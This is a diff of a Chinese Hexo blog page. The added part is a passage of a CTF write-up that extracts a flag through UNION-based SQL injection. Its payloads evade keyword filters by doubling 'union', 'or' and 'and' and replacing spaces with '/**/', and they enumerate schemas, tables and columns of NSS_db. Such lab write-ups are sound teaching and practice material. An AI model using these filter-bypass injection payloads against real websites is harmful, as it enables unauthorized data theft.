+<p>union用双写绕过，空格用/**/绕过</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,3#</span><br><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,3,4#  //报错</span><br></pre></td></tr></table></div></figure>
+
+<p>所以有三列</p>
+
+        <h5 id="获取数据库名-2"   >
+          <a href="#获取数据库名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(schema_name)/**/from/**/information_schema.schemata#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281024254.png" alt="image-20240528102414157"></p>
+<p>看来是又过滤了or，继续双写绕过</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(schema_name)/**/from/**/infoorrmation_schema.schemata#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281025559.png" alt="image-20240528102508464"></p>
+
+        <h5 id="获取表名-2"   >
+          <a href="#获取表名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=&#x27;NSS_db&#x27;#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281029838.png" alt="image-20240528102955757"></p>
+
+        <h5 id="获取表字段名-2"   >
+          <a href="#获取表字段名-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取表字段名-2" class="headerlink" title="获取表字段名"></a>获取表字段名</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=&#x27;NSS_db&#x27;/**/and/**/table_name=&#x27;NSS_tb&#x27;#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281032478.png" alt="image-20240528103207417"></p>
+<p>看来是过滤了and，继续双写绕过</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_schema=&#x27;NSS_db&#x27;/**/anandd/**/table_name=&#x27;NSS_tb&#x27;#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281032816.png" alt="image-20240528103243726"></p>
+
+        <h5 id="获取字段内容-2"   >
+          <a href="#获取字段内容-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#获取字段内容-2" class="headerlink" title="获取字段内容"></a>获取字段内容</h5>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(flll444g)/**/from/**/NSS_db.NSS_tb#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281034885.png" alt="image-20240528103419783"></p>
+<p>提交发现也不对…再换成Secr3t字段看看</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nss=&#x27;uniunionon/**/select/**/1,2,group_concat(Secr3t)/**/from/**/NSS_db.NSS_tb#</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202405281035772.png" alt="image-20240528103501682"></p>
+<p>这次是真的正确的flag了</p>
 </div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/06/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">PHP环境搭建</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-01-14</span></span></div></header><div class="post-body"><div class="post-excerpt">
         <h1 id="一、调试搭建"   >
           <a href="#一、调试搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、调试搭建" class="headerlink" title="一、调试搭建"></a>一、调试搭建</h1>
@@ -3878,4 +4104,4 @@ exit;
 <p>回车</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051654105.png" alt="image-20240105165440045"></p>
 <p>得到flag</p>
-</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">6</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><span class="page-number current">1</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">7</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
